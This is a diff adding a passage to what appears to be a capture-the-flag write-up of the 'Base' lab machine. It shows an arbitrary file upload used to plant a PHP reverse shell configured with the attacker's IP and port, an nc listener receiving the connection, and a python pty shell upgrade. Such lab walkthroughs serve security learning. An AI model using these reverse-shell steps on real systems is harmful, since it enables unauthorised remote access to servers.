@@ -97,6 +97,56 @@
 
     $ touch 1 > test.txt
 
+// Upload test.txt and navigate to http://10.10.10.48/_uploaded/test.txt , it works!
+
+
+![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Base/6.png)
+
+
+// lets upload php reverse shell (u can either cp or download from ![here](https://www.revshells.com/))
+
+    $ cp /usr/share/laudanum/php/php-reverse-shell.php php_rshell.php
+// editing the file with our ip and port
+
+    ...
+    set_time_limit (0);
+    $VERSION = "1.0";
+    $ip = '10.10.16.14';  // CHANGE THIS
+    $port = 1444;       // CHANGE THIS
+    $chunk_size = 1400;
+    $write_a = null;
+    $error_a = null;
+    $shell = 'uname -a; w; id; /bin/sh -i';
+    $daemon = 0;
+    $debug = 0;
+    ...
+
+// open a listiner with nc
+
+    $ rlwrap nc -lvnp 1444
+    listening on [any] 1444 ...
+ 
+ // and navigate to 10.10.10.48/_uploaded/php_rshell.php
+ 
+    $ rlwrap nc -lvnp 1444
+    listening on [any] 1444 ...
+    connect to [10.10.16.14] from (UNKNOWN) [10.10.10.48] 40934
+    Linux base 4.15.0-88-generic #88-Ubuntu SMP Tue Feb 11 20:11:34 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+     06:15:16 up 13:43,  0 users,  load average: 0.00, 0.00, 0.00
+    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    /bin/sh: 0: can't access tty; job control turned off
+    id
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+// lets promote shell using python
+
+    python3 -c "import pty;pty.spawn('/bin/bash')"
+
+
+
+
 
 
 
